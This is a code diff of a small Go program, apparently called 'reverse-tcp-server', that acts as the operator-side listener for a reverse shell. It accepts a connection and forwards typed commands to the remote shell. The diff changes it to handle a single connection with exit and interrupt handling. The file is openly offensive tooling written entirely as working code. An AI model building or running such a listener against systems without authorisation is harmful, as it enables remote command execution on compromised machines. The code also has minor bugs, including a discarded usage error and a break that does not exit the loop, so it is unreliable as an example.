@@ -4,46 +4,35 @@ import (
 	"bufio"
 	"fmt"
 	"io"
-	"math/rand"
 	"net"
 	"os"
+	"os/signal"
 	"strings"
-	"time"
 )
 
 const (
-	connType = "tcp"
+	connType = "tcp4"
 )
 
-func RevShellListener(port string, done chan<- bool) {
+func RevShellListener(port string) {
 	fmt.Printf("Starting listener...\n")
 	port = ":" + port
-	conn, err := net.Listen("tcp4", port)
+	conn, err := net.Listen(connType, port)
 	if err != nil {
 		fmt.Println("listening error: ", err)
 		return
 	}
-	defer func() {
-		conn.Close()
-		done <- true
-	}()
+	defer conn.Close()
 
-	rand.Seed(time.Now().Unix())
-
-	for {
-		c, err := conn.Accept()
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		go handleConnection(c)
+	c, err := conn.Accept()
+	if err != nil {
+		fmt.Println(err)
+		return
 	}
+	handleConnection(c)
 }
 
 func handleConnection(conn net.Conn) {
-	//connection closed
-	defer conn.Close()
-
 	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
 	reader := bufio.NewReader(os.Stdin)
 
@@ -54,36 +43,42 @@ func handleConnection(conn net.Conn) {
 			return
 		}
 	}()
+
+	quit := make(chan os.Signal, 1)
+	signal.Notify(quit, os.Interrupt)
 	for {
-		toExec, err := reader.ReadBytes('\n')
-		if err != nil {
-			fmt.Println("read error")
-			break
-		}
+		select {
+		case <-quit:
+			return
+		default:
+			toExec, err := reader.ReadBytes('\n')
+			if err != nil {
+				fmt.Println("read error")
+				break
+			}
 
-		temp := strings.TrimSpace(string(toExec))
-		//fmt.Printf("Executing: %s\n", temp)
-		_, err = fmt.Fprintf(conn, "%s\n", temp)
-		if err != nil {
-			fmt.Println("Get error: " + err.Error())
-			continue
+			temp := strings.TrimSpace(string(toExec))
+			if temp == "exit" {
+				return
+			}
+			//fmt.Printf("Executing: %s\n", temp)
+			_, err = fmt.Fprintf(conn, "%s\n", temp)
+			if err != nil {
+				fmt.Println("Get error: " + err.Error())
+				continue
+			}
 		}
-
 	}
-
 }
 
 func main() {
 	arguments := os.Args
-	done := make(chan bool)
 	if len(arguments) == 1 {
 		fmt.Errorf("Usage: ./reverse-tcp-server <port_number>")
 		return
 	}
 
 	fmt.Printf("Starting\n")
-
-	go RevShellListener(arguments[1], done)
-	<-done
+	RevShellListener(arguments[1])
 	fmt.Println("Finished")
 }
